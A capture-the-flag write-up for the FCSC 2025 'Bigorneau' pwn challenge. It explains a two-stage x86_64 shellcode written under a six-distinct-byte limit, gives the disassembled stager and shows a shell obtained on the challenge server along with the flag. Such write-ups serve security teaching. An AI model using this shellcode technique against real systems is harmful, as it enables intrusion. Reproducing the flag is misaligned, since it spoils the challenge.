# Bigorneau

This challenge is the 3rd most solved pwn challenge at the 2025 edition of the FCSC. We are provided a few resources:
 - an address and a port to connect to
 - the binary (`x86_64` architecture)
 - the source code of the binary
 - a python script that is run on the server

## First steps

### Playing with the service

```
➜  03-bigorneau nc chal.fcsc.fr 2102
Enter your shellcode (hex, at most 128 bytes):
1203980aaaaaa
Please check your inputs.
^C
```

### Analyzing the source code

#### `bigorneau.py`

This script:
 - converts the hex input as bytes
 - checks that there are at most 6 different bytes and less that 0x80 bytes in total
 - inserts some instructions to clear the registers beforehand
 - writes the resulting bytes to a temporary file
 - calls the program with the path to this temporary file as its first argument

#### `bigorneau.c`

The program simply reads the shellcode found at the path of the first argument on the stack, and jumps to it. Since the program is compiled with no NX bit protection on stack, this is fine.

## Solving

### Strategy

In summary, we need to find an `x86_64` shellcode with at most 6 different bytes.

In order to do this, I proceeded in two steps:
 - a first stage shellcode simply reads from user input on the stack (`read(<stack>, 0, <size>)`)
 - the second stage shellcode (a simple `execve("/bin/sh", NULL, NULL)` padded with NOPS at the beginning) can then be sent to overwrite the current instructions

 The real challenge here is to write the first stage shellcode. Hopefully for us, all registers are cleared beforehand (thanks to the script), so `rdi` (the input fd) and `rax` (the syscall number) are already zero (`stdin` fd and `read` syscall number).
 
 Now, let's see what is left to do:
 - somehow move `rsp` to `rsi` -> push/pop instructions are only 1 byte long
 - set `rdx` to a large enough value to allow for the shellcode -> `dl` is enough
 - do a syscall -> 2 bytes

Here is the resulting shellcode:

```
0x00000000      54             push rsp
0x00000001      5e             pop rsi
0x00000002      b2f0           mov dl, 0xf0
0x00000004      0f05           syscall
```

## Result

```
➜  03-bigorneau python expl.py 
[+] Opening connection to chal.fcsc.fr on port 2102: Done
[*] Switching to interactive mode
Enter your shellcode (hex, at most 128 bytes):
$ ls
bigorneau
bigorneau.py
flag.txt
$ cat flag.txt
FCSC{619c629f9dd846fe8f1db9f23693707b7a334ab7da1507dc904b9d5c3fc2a15c}
$ 
```
